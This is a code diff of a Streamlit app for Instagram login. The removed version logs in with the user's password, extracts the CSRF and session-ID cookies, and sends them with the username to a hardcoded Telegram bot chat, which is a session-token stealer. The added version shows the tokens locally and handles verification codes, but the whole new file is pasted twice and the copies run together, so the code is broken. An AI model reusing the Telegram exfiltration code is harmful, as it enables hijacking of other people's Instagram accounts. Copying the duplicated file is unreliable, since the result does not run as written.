@@ -1,73 +1,233 @@
 import streamlit as st
-import asyncio
 import requests
-from playwright.async_api import async_playwright
 
-# Replace with your bot token and Telegram user/chat ID
-TELEGRAM_BOT_TOKEN = "your_bot_token_here"
-TELEGRAM_CHAT_ID = "your_chat_id_here"
+# -------------------
+# Instagram Login Logic
+# -------------------
 
-def send_to_telegram(csrf, sessionid, username):
-    message = f"🔐 *Instagram Token Extracted*\n\n👤 Username: `{username}`\n🛡️ CSRF Token: `{csrf}`\n🔑 Session ID: `{sessionid}`"
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    payload = {
-        "chat_id": TELEGRAM_CHAT_ID,
-        "text": message,
-        "parse_mode": "Markdown"
+def login_instagram(username, password):
+    session = requests.Session()
+    headers = {
+        'User-Agent': 'Mozilla/5.0',
+        'X-Requested-With': 'XMLHttpRequest',
+        'Referer': 'https://www.instagram.com/accounts/login/',
     }
+
     try:
-        response = requests.post(url, json=payload)
-        return response.status_code == 200
-    except Exception as e:
-        return False
+        session.get('https://www.instagram.com/accounts/login/', headers=headers)
+        csrf_token = session.cookies.get_dict().get('csrftoken')
 
-async def extract_tokens(username, password):
+        login_data = {
+            'username': username,
+            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{password}',
+            'queryParams': {},
+            'optIntoOneTap': 'false'
+        }
+
+        headers['X-CSRFToken'] = csrf_token
+
+        response = session.post('https://www.instagram.com/accounts/login/ajax/', data=login_data, headers=headers)
+        json_response = response.json()
+
+        if json_response.get("authenticated"):
+            cookies = session.cookies.get_dict()
+            return cookies.get("csrftoken"), cookies.get("sessionid"), "success", "Logged in", session
+
+        elif "checkpoint_url" in json_response:
+            return None, None, "checkpoint", json_response["checkpoint_url"], session
+
+        else:
+            return None, None, "failed", json_response.get("message", "Login failed"), session
+
+    except Exception as e:
+        return None, None, "error", str(e), session
+
+def verify_checkpoint(session_obj, checkpoint_url, code):
     try:
-        async with async_playwright() as p:
-            browser = await p.chromium.launch(headless=True)
-            context = await browser.new_context()
-            page = await context.new_page()
+        headers = {
+            "User-Agent": "Mozilla/5.0",
+            "X-CSRFToken": session_obj.cookies.get("csrftoken"),
+        }
 
-            await page.goto("https://www.instagram.com/accounts/login/")
-            await page.wait_for_selector("input[name='username']", timeout=10000)
+        data = {
+            "security_code": code
+        }
 
-            await page.fill("input[name='username']", username)
-            await page.fill("input[name='password']", password)
-            await page.click("button[type='submit']")
+        resp = session_obj.post(f"https://www.instagram.com{checkpoint_url}", data=data, headers=headers)
+        cookies = session_obj.cookies.get_dict()
 
-            try:
-                await page.wait_for_url("https://www.instagram.com/", timeout=15000)
-            except:
-                return None, None
-
-            cookies = await context.cookies()
-            csrf = next((c["value"] for c in cookies if c["name"] == "csrftoken"), None)
-            sessionid = next((c["value"] for c in cookies if c["name"] == "sessionid"), None)
-
-            await browser.close()
-            return csrf, sessionid
+        if resp.status_code == 200 and "authenticated" in resp.text:
+            return cookies.get("csrftoken"), cookies.get("sessionid"), True
+        else:
+            return None, None, False
     except Exception as e:
-        return None, None
+        return None, None, False
 
+# -------------------
 # Streamlit UI
-st.set_page_config(page_title="IG Token Extractor", layout="centered")
-st.title("Instagram Token Extractor (via Telegram)")
+# -------------------
 
-username = st.text_input("Instagram Username")
-password = st.text_input("Instagram Password", type="password")
+st.set_page_config(page_title="Instagram CSRF & Session Fetcher", layout="centered")
+st.title("🔐 Instagram Login Tool")
+st.markdown("Enter your Instagram **username** and **password** to retrieve the `CSRF token` and `Session ID`.")
 
-if st.button("Extract and Send via Telegram"):
-    if not username or not password:
-        st.warning("Please fill in both username and password.")
+# Session state to hold checkpoint
+if "session_obj" not in st.session_state:
+    st.session_state.session_obj = None
+    st.session_state.checkpoint_url = None
+    st.session_state.awaiting_code = False
+
+# Input form
+with st.form("login_form"):
+    username = st.text_input("📱 Instagram Username")
+    password = st.text_input("🔑 Instagram Password", type="password")
+    submitted = st.form_submit_button("Login & Fetch Tokens")
+
+if submitted:
+    csrf, session_id, status, message, session_obj = login_instagram(username, password)
+
+    if status == "success":
+        st.success("✅ Login Successful")
+        st.code(f"CSRF Token: {csrf}", language="text")
+        st.code(f"Session ID: {session_id}", language="text")
+
+    elif status == "checkpoint":
+        st.warning("🔐 Checkpoint Required: Enter the code sent to your email or phone below.")
+        st.session_state.session_obj = session_obj
+        st.session_state.checkpoint_url = message
+        st.session_state.awaiting_code = True
+
     else:
-        with st.spinner("Logging in to Instagram..."):
-            csrf_token, session_id = asyncio.run(extract_tokens(username, password))
+        st.error(f"❌ Login Failed: {message}")
 
-            if csrf_token and session_id:
-                success = send_to_telegram(csrf_token, session_id, username)
-                if success:
-                    st.success("✅ Token extracted and sent to Telegram.")
-                else:
-                    st.error("❌ Failed to send token to Telegram.")
-            else:
-                st.error("Login failed or tokens not found.")
+# Checkpoint code input
+if st.session_state.awaiting_code:
+    st.subheader("🔑 Verification Code")
+    code = st.text_input("Enter Instagram verification code (SMS/Email):")
+    if st.button("Submit Code"):
+        csrf, session_id, success = verify_checkpoint(
+            st.session_state.session_obj, st.session_state.checkpoint_url, code
+        )
+        if success:
+            st.success("✅ Verification Passed")
+            st.code(f"CSRF Token: {csrf}", language="text")
+            st.code(f"Session ID: {session_id}", language="text")
+            st.session_state.awaiting_code = False
+        else:
+            st.error("❌ Invalid code or verification failed.")import streamlit as st
+import requests
+
+# -------------------
+# Instagram Login Logic
+# -------------------
+
+def login_instagram(username, password):
+    session = requests.Session()
+    headers = {
+        'User-Agent': 'Mozilla/5.0',
+        'X-Requested-With': 'XMLHttpRequest',
+        'Referer': 'https://www.instagram.com/accounts/login/',
+    }
+
+    try:
+        session.get('https://www.instagram.com/accounts/login/', headers=headers)
+        csrf_token = session.cookies.get_dict().get('csrftoken')
+
+        login_data = {
+            'username': username,
+            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{password}',
+            'queryParams': {},
+            'optIntoOneTap': 'false'
+        }
+
+        headers['X-CSRFToken'] = csrf_token
+
+        response = session.post('https://www.instagram.com/accounts/login/ajax/', data=login_data, headers=headers)
+        json_response = response.json()
+
+        if json_response.get("authenticated"):
+            cookies = session.cookies.get_dict()
+            return cookies.get("csrftoken"), cookies.get("sessionid"), "success", "Logged in", session
+
+        elif "checkpoint_url" in json_response:
+            return None, None, "checkpoint", json_response["checkpoint_url"], session
+
+        else:
+            return None, None, "failed", json_response.get("message", "Login failed"), session
+
+    except Exception as e:
+        return None, None, "error", str(e), session
+
+def verify_checkpoint(session_obj, checkpoint_url, code):
+    try:
+        headers = {
+            "User-Agent": "Mozilla/5.0",
+            "X-CSRFToken": session_obj.cookies.get("csrftoken"),
+        }
+
+        data = {
+            "security_code": code
+        }
+
+        resp = session_obj.post(f"https://www.instagram.com{checkpoint_url}", data=data, headers=headers)
+        cookies = session_obj.cookies.get_dict()
+
+        if resp.status_code == 200 and "authenticated" in resp.text:
+            return cookies.get("csrftoken"), cookies.get("sessionid"), True
+        else:
+            return None, None, False
+    except Exception as e:
+        return None, None, False
+
+# -------------------
+# Streamlit UI
+# -------------------
+
+st.set_page_config(page_title="Instagram CSRF & Session Fetcher", layout="centered")
+st.title("🔐 Instagram Login Tool")
+st.markdown("Enter your Instagram **username** and **password** to retrieve the `CSRF token` and `Session ID`.")
+
+# Session state to hold checkpoint
+if "session_obj" not in st.session_state:
+    st.session_state.session_obj = None
+    st.session_state.checkpoint_url = None
+    st.session_state.awaiting_code = False
+
+# Input form
+with st.form("login_form"):
+    username = st.text_input("📱 Instagram Username")
+    password = st.text_input("🔑 Instagram Password", type="password")
+    submitted = st.form_submit_button("Login & Fetch Tokens")
+
+if submitted:
+    csrf, session_id, status, message, session_obj = login_instagram(username, password)
+
+    if status == "success":
+        st.success("✅ Login Successful")
+        st.code(f"CSRF Token: {csrf}", language="text")
+        st.code(f"Session ID: {session_id}", language="text")
+
+    elif status == "checkpoint":
+        st.warning("🔐 Checkpoint Required: Enter the code sent to your email or phone below.")
+        st.session_state.session_obj = session_obj
+        st.session_state.checkpoint_url = message
+        st.session_state.awaiting_code = True
+
+    else:
+        st.error(f"❌ Login Failed: {message}")
+
+# Checkpoint code input
+if st.session_state.awaiting_code:
+    st.subheader("🔑 Verification Code")
+    code = st.text_input("Enter Instagram verification code (SMS/Email):")
+    if st.button("Submit Code"):
+        csrf, session_id, success = verify_checkpoint(
+            st.session_state.session_obj, st.session_state.checkpoint_url, code
+        )
+        if success:
+            st.success("✅ Verification Passed")
+            st.code(f"CSRF Token: {csrf}", language="text")
+            st.code(f"Session ID: {session_id}", language="text")
+            st.session_state.awaiting_code = False
+        else:
+            st.error("❌ Invalid code or verification failed.")
